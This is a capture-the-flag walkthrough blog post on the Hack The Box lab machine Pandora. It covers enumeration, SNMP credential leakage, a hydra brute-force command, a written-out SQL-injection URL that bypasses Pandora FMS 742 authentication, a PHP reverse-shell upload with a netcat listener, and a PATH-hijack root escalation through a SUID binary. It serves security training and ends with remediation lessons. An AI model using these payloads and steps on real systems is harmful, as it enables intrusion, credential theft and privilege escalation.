---
layout: post
title: Hack The Box Walkthrough - Pandora
date: 2022-03-26
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
permalink: /2022/03/HTB/Pandora
img: 2022/03/Pandora/Pandora.png
---


* Room: Pandora
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Pandora](https://app.hackthebox.com/machines/Pandora)
* Authors:
  * [TheCyberGeek](https://app.hackthebox.com/users/114053)
  * [dmw0ng](https://app.hackthebox.com/users/610173)

## Enumeration

I started the box by checking for opened ports.

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.136.53:22
Open 10.129.136.53:80
Open 10.129.136.53:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 11:24 EDT
...

Nmap scan report for target (10.129.136.53)
Host is up, received syn-ack (0.029s latency).
Scanned at 2022-03-26 11:24:28 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+iss
SZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+
kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds
```

Only SSH (22) and HTTP (80) ports are opened.

I started [Ferox](https://github.com/epi052/feroxbuster) to scan the web site for hidden files and folder.

```bash
ehogue@kali:~/Kali/OnlineCTFs/HackTheBox/Pandora$ feroxbuster -u http://panda.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://panda.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      307c http://panda.htb/assets => http://panda.htb/assets/
403      GET        9l       28w      274c http://panda.htb/.htpasswd
403      GET        9l       28w      274c http://panda.htb/.htaccess
403      GET        9l       28w      274c http://panda.htb/.hta
403      GET        9l       28w      274c http://panda.htb/assets/.htaccess
403      GET        9l       28w      274c http://panda.htb/assets/.htpasswd
403      GET        9l       28w      274c http://panda.htb/assets/.hta
301      GET        9l       28w      311c http://panda.htb/assets/css => http://panda.htb/assets/css/
403      GET        9l       28w      274c http://panda.htb/assets/css/.hta
403      GET        9l       28w      274c http://panda.htb/assets/css/.htaccess
403      GET        9l       28w      274c http://panda.htb/assets/css/.htpasswd
200      GET      907l     2081w    33560c http://panda.htb/index.html
301      GET        9l       28w      313c http://panda.htb/assets/fonts => http://panda.htb/assets/fonts/
403      GET        9l       28w      274c http://panda.htb/assets/fonts/.hta
403      GET        9l       28w      274c http://panda.htb/assets/fonts/.htpasswd
301      GET        9l       28w      314c http://panda.htb/assets/images => http://panda.htb/assets/images/
403      GET        9l       28w      274c http://panda.htb/assets/images/.htpasswd
403      GET        9l       28w      274c http://panda.htb/assets/images/.hta
403      GET        9l       28w      274c http://panda.htb/assets/images/.htaccess
301      GET        9l       28w      318c http://panda.htb/assets/images/404 => http://panda.htb/assets/images/404/
301      GET        9l       28w      310c http://panda.htb/assets/js => http://panda.htb/assets/js/
403      GET        9l       28w      274c http://panda.htb/assets/images/404/.hta
403      GET        9l       28w      274c http://panda.htb/assets/images/404/.htaccess
301      GET        9l       28w      320c http://panda.htb/assets/images/about => http://panda.htb/assets/images/about/
301      GET        9l       28w      321c http://panda.htb/assets/images/banner => http://panda.htb/assets/images/banner/
403      GET        9l       28w      274c http://panda.htb/assets/images/banner/.htaccess
403      GET        9l       28w      274c http://panda.htb/assets/images/banner/.hta
301      GET        9l       28w      319c http://panda.htb/assets/images/blog => http://panda.htb/assets/images/blog/
403      GET        9l       28w      274c http://panda.htb/assets/images/blog/.htpasswd
301      GET        9l       28w      321c http://panda.htb/assets/images/brands => http://panda.htb/assets/images/brands/
403      GET        9l       28w      274c http://panda.htb/assets/images/brands/.htaccess
403      GET        9l       28w      274c http://panda.htb/server-status
403      GET        9l       28w      274c http://panda.htb/assets/fonts/.htaccess
301      GET        9l       28w      318c http://panda.htb/assets/images/faq => http://panda.htb/assets/images/faq/
403      GET        9l       28w      274c http://panda.htb/assets/images/faq/.htaccess
301      GET        9l       28w      321c http://panda.htb/assets/images/footer => http://panda.htb/assets/images/footer/
403      GET        9l       28w      274c http://panda.htb/assets/images/blog/.hta
301      GET        9l       28w      319c http://panda.htb/assets/images/logo => http://panda.htb/assets/images/logo/
301      GET        9l       28w      328c http://panda.htb/assets/images/footer/brands => http://panda.htb/assets/images/footer/brands/
301      GET        9l       28w      327c http://panda.htb/assets/images/testimonials => http://panda.htb/assets/images/testimonials/
301      GET        9l       28w      319c http://panda.htb/assets/images/team => http://panda.htb/assets/images/team/
403      GET        9l       28w      274c http://panda.htb/assets/images/team/.htaccess
[####################] - 1m     75376/75376   0s      found:42      errors:2069
[####################] - 27s     4711/4711    173/s   http://panda.htb
[####################] - 24s     4711/4711    193/s   http://panda.htb/assets
[####################] - 29s     4711/4711    168/s   http://panda.htb/assets/css
[####################] - 31s     4711/4711    151/s   http://panda.htb/assets/fonts
[####################] - 33s     4711/4711    147/s   http://panda.htb/assets/images
[####################] - 35s     4711/4711    135/s   http://panda.htb/assets/images/404
[####################] - 44s     4711/4711    106/s   http://panda.htb/assets/js
[####################] - 44s     4711/4711    108/s   http://panda.htb/assets/images/about
[####################] - 39s     4711/4711    119/s   http://panda.htb/assets/images/banner
[####################] - 42s     4711/4711    112/s   http://panda.htb/assets/images/blog
[####################] - 34s     4711/4711    136/s   http://panda.htb/assets/images/brands
[####################] - 37s     4711/4711    128/s   http://panda.htb/assets/images/faq
[####################] - 36s     4711/4711    130/s   http://panda.htb/assets/images/footer
[####################] - 31s     4711/4711    149/s   http://panda.htb/assets/images/logo
[####################] - 27s     4711/4711    173/s   http://panda.htb/assets/images/testimonials
[####################] - 23s     4711/4711    209/s   http://panda.htb/assets/images/team
```

While this was running, I launched Burp and Firefox to navigate to the site.

![Main Site](/assets/images/2022/03/Pandora/MainSite.png "Main Site")

I spent a lot of time going through the site. Looking at the requests and responses in Burp. I went through everything Ferox had found.

There was a contact form at the bottom of the page. 

![Send Us A Message Form](/assets/images/2022/03/Pandora/SendUsAMessage.png "Send Us A Message Form")

I tried sending payloads for SQL Injections and Cross Site Scripting (XSS). I could not get anything working. 

I kept enumerating the machine. I tried running Ferox again with different lists. Then I tried scanning for UDP ports. 

```bash
sudo nmap -sU target -oN nampUdp.txt
[sudo] password for ehogue:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 19:36 EDT
Nmap scan report for target (10.129.138.9)
Host is up (0.029s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 1019.74 seconds
```

The [Simple Network Management Protocol (SNMP) port](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol) was open. I tried connecting to the port with netcat. It connected, but I had no idea how to interact with SNMP. I looked around and found a Metasploit module that could use SNMP to enumerate the machine. 

```bash
$ msfconsole


                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.1.32-dev                          ]
+ -- --=[ 2205 exploits - 1168 auxiliary - 395 post       ]
+ -- --=[ 596 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable HTTP request and response logging
with set HttpTrace true

msf6 > search snmp

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   auxiliary/scanner/snmp/aix_version                                        normal     No     AIX SNMP Scanner Auxiliary Module
   ...
   25  auxiliary/scanner/snmp/snmp_enum                                          normal     No     SNMP Enumeration Module
...

Interact with a module by name or index. For example info 33, use 33 or use auxiliary/scanner/snmp/xerox_workcentre_enumusers

msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > options

Module options (auxiliary/scanner/snmp/snmp_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      161              yes       The target port (UDP)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>

msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS target.htb
RHOSTS => target.htb

msf6 auxiliary(scanner/snmp/snmp_enum) > exploit

[+] 10.129.141.22, Connected.

[*] System information:

Host IP                       : 10.129.141.22
Hostname                      : pandora
Description                   : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
Contact                       : Daniel
Location                      : Mississippi
Uptime snmp                   : 00:16:33.93
Uptime system                 : 00:16:24.44
System date                   : 2022-3-21 23:20:50.0

[*] Network information:

IP forwarding enabled         : no
Default TTL                   : 64
TCP segments received         : 296
TCP segments sent             : 387
TCP segments retrans          : 269
Input datagrams               : 3544
Delivered datagrams           : 3542
Output datagrams              : 1744

[*] Network interfaces:

Interface                     : [ up ] lo
Id                            : 1
Mac Address                   : :::::
Type                          : softwareLoopback
Speed                         : 10 Mbps
MTU                           : 65536
In octets                     : 84736
Out octets                    : 84736

Interface                     : [ up ] VMware VMXNET3 Ethernet Controller
Id                            : 2
Mac Address                   : 00:50:56:b9:c6:75
Type                          : ethernet-csmacd
Speed                         : 4294 Mbps
MTU                           : 1500
In octets                     : 382127
Out octets                    : 167199


[*] Network IP:

Id                  IP Address          Netmask             Broadcast
2                   10.129.141.22       255.255.0.0         1
1                   127.0.0.1           255.0.0.0           0

[*] Routing information:

Destination         Next hop            Mask                Metric
0.0.0.0             10.129.0.1          0.0.0.0             1
10.129.0.0          0.0.0.0             255.255.0.0         0

[*] TCP connections and listening ports:

Local address       Local port          Remote address      Remote port         State
0.0.0.0             22                  0.0.0.0             0                   listen
10.129.141.22       33500               1.1.1.1             53                  synSent
127.0.0.1           3306                0.0.0.0             0                   listen
127.0.0.53          53                  0.0.0.0             0                   listen

[*] Listening UDP ports:

Local address       Local port
0.0.0.0             68
0.0.0.0             161
127.0.0.53          53

...

[*] Processes:

Id                  Status              Name                Path                Parameters
1                   runnable            systemd             /sbin/init          maybe-ubiquity
2                   runnable            kthreadd
3                   unknown             rcu_gp
...

987                 runnable            sh                  /bin/sh             -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p REDACTED'
...
1133                runnable            host_check          /usr/bin/host_check -u daniel -p REDACTED
...
```

The process list contained the credentials for a user. I tried using them to SSH to the machine. 

```bash
$ ssh daniel@target
daniel@target's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 21 Mar 23:24:51 UTC 2022

  System load:           0.0
  Usage of /:            63.0% of 4.87GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.141.22
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c675

  => /boot is using 91.8% of 219MB

...

daniel@pandora:~$
```

## Privilege Escalation

I was in the machine. But the user's home folder did not contain a flag. There was another user named matt. They had the flag, but daniel was not allowed to read it. 

I looked for ways to get access to the user matt. I stated with the obvious things like looking at files in the home folder, sudo, and crontab.

```bash
daniel@pandora:~$ ls -la
total 28
drwxr-xr-x 4 daniel daniel 4096 Mar 26 15:51 .
drwxr-xr-x 4 root   root   4096 Dec  7 14:32 ..
lrwxrwxrwx 1 daniel daniel    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel 3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel 4096 Mar 26 15:51 .cache
-rw-r--r-- 1 daniel daniel  807 Feb 25  2020 .profile
drwx------ 2 daniel daniel 4096 Dec  7 14:32 .ssh

daniel@pandora:~$ ls -la .ssh/
total 12
drwx------ 2 daniel daniel 4096 Dec  7 14:32 .
drwxr-xr-x 4 daniel daniel 4096 Mar 26 15:51 ..
-rw------- 1 daniel daniel    1 Dec  7 14:59 authorized_keys


daniel@pandora:~$ sudo -l
[sudo] password for daniel: 
Sorry, user daniel may not run sudo on pandora.

daniel@pandora:~$ crontab -l
no crontab for daniel
```

I also search for files with the suid bit set.

```bash
daniel@pandora:~$ find / -perm /u=s 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
...
/usr/bin/pandora_backup
...

daniel@pandora:~$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

The pandora_backup file had it and was own by root. But only matt could execute it. I kept a note about it, but I needed to keep searching for ways to escalate to matt. 

When I looked at the enabled site in Apache, I found a site that was only accessible locally. 

```bash
$ cat /etc/apache2/sites-enabled/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

I opened a SSH tunnel to be able to access the site in my browser. 

```bash
$ ssh -L 80:localhost:80 daniel@target
```

And then opened `http://localhost/`. I was redirected to `pandora_console`. 

![Pandora FMS](/assets/images/2022/03/Pandora/PandoraFMS.png "Pandora FMS")

[Pandora FMS](https://pandorafms.com/) is a monitoring solution written in PHP. I tried to login with daniel's credentials. But it gave me an error saying the user could only use the API. 

I looked at the code, and I needed a user that was an admin or had the `not_login` flag set to false. 

```php
} else {
        if (((bool) $user_in_db['is_admin'] === false)
            && ((bool) $user_in_db['not_login'] === true)
        ) {
            // Logout.
            $_REQUEST = [];
            $_GET = [];
            $_POST = [];
            $config['auth_error'] = __('User only can use the API.');
```

I looked for the database credentials to tried and change daniel's user to admin. But only matt could read the configuration. 

```bash
$ ls -la include/config.php 
-rw------- 1 matt matt 413 Dec  3 14:06 include/config.php
```

I read the code to the site, trying to find flaws in the login or API code. I checked the logs that were in the same folder. 

```bash
$ cat audit.log
2021-06-11 17:11:48 - admin - Logon - 192.168.220.11 - Logged in
2021-06-11 17:28:54 - admin - User management - 192.168.220.11 - Created user matt
2021-06-11 17:29:06 - admin - User management - 192.168.220.11 - Updated user matt
2021-06-11 17:29:21 - admin - User management - 192.168.220.11 - Added profile for user matt
2021-06-11 17:29:43 - admin - User management - 192.168.220.11 - Added profile for user matt
2021-06-11 17:29:56 - matt - Logon - 192.168.220.11 - Logged in
2021-06-16 23:24:12 - admin - Logon - 127.0.0.1 - Logged in
2021-06-16 23:24:40 - admin - User management - 127.0.0.1 - Updated user admin
2021-06-16 23:24:57 - admin - User management - 127.0.0.1 - Updated user matt
2021-06-17 00:09:46 - admin - Logon - 127.0.0.1 - Logged in
2021-06-17 00:11:54 - admin - User management - 127.0.0.1 - Created user daniel
2021-06-17 00:12:08 - admin - User management - 127.0.0.1 - Added profile for user daniel
2021-06-17 21:10:18 - N/A - No session - 127.0.0.1 - Trying to access without a valid session
2021-06-17 21:10:28 - N/A - No session - 127.0.0.1 - Trying to access without a valid session
2021-06-17 21:10:44 - matt - Logon - 127.0.0.1 - Logged in
```

This gave some potential usernames, so I tried to bruteforce the loging. 

```bash
$ cat users.txt 
admin
matt

$ hydra -l users.txt -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/pandora_console/index.php?login=1:nick=^USER^&pass=^PASS^&login_button=Login:incorrect' localhost http-post-form
```

I left that run for a while with no success. 

I went back looking at the site and saw the version number 742. I tried searching for 'Pandora FMS 742 exploit'. The first result was a [post on vulnerabilities found in Pandora FMS 742](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained). The next one was a [repository with a script exploiting the vulnerabilities](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated). The script exploits an SQL Injection vulnerability in the way sessions are handled in some files to login as the admin user. Then it gets remote code execution by uploading a PHP file that executes commands passed in the `test` parameter and accessing the file. 

I did the exploit manually to be sure I understood it better. First I navigated to `http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20-`. It gave me a blank page, but when I went back to the index page, I was logged in as admin. 

![Admin Dashboard](/assets/images/2022/03/Pandora/PandoraAdminDashboard.png "Admin Dashboard")

The next step was uploading the PHP reverse shell. I went to the File Manager in Pandora. 

![File Manager Menu](/assets/images/2022/03/Pandora/FileManagerMenu.png "File Manager Menu")

I first tried to upload an image I had in my Kali VM. The image was uploaded and was then available at http://127.0.0.1/pandora_console/images/mountains.jpg . I then uploaded php-reverse-shell.php, started a netcat listener and accessed the PHP file in my browser. 

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.136.63 38486
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 12:28:10 up 17 min,  1 user,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.19      12:26    1:48   0.02s  0.02s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)

$ whoami
matt

$ cat /home/matt/user.txt
REDACTED
```

I was connected as matt, and I had the first flag. 

## Getting root

Now I nedded to get root. But first I wanted to have a better shell. So I copied my public key to the server and reconnected with SSH.

```bash
$ cd /home/matt

$ mkdir .ssh

$ echo "ssh-rsa PUBLIC_KEY eric@kali" >> .ssh/authorized_keys


$ chmod 700 .ssh
$ chmod 600 .ssh/authorized_keys
```

Getting root was simple since I had already found the suid binary earlier. Having the suid bit set meant that when matt executed the binary file, it would run with the owner (root) privileges. So if I could use it start start a shell, it would be a root shell. 

```bash
matt@pandora:~$ ls -la /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup

matt@pandora:~$ file /usr/bin/pandora_backup
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped

matt@pandora:~$ strings /usr/bin/pandora_backup

Command 'strings' not found, but can be installed with:

apt install binutils
Please ask your administrator.
```

Strings was not installed on the server, so I used scp to get the binary on my machine and inspect it from there.

```bash
$ scp matt@target:/usr/bin/pandora_backup .
pandora_backup                                                                                                                                                                                           100%   16KB 304.9KB/s   00:00

$ strings pandora_backup
...
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH           
[]A\A]A^A_          
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!           
Check your permissions!   
Backup successful!
Terminating program!
;*3$"    
GCC: (Debian 10.2.1-6) 10.2.1 20210110
...
```

The program uses tar to archive the files in a folder. But it does not provide the full path of the tar binary. So if I could create a tar executable and make sure it was found in my path before the real one, mine would be executed. 

```bash
matt@pandora:~$ cat tar
#!/bin/bash
/bin/bash -p

matt@pandora:~$ chmod +x tar

matt@pandora:~$ PATH=/home/matt:$PATH

matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client

root@pandora:~# whoami
root

root@pandora:~# cat /root/root.txt
REDACTED
```

## Lessons Learned

This box exploits a few errors. 
* SNMP should not have been accessible
* Credentials should not be used on the command line because they will appear in the list of processes
* Applications should be kept up to date
  * Pandora FMS should use prepared statements instead of building SQL queries as strings
  * Allowing file uploads is very risky
* The backup script should run as a root cronjobs instead of using suid
* Full path should be used when calling commands like tar
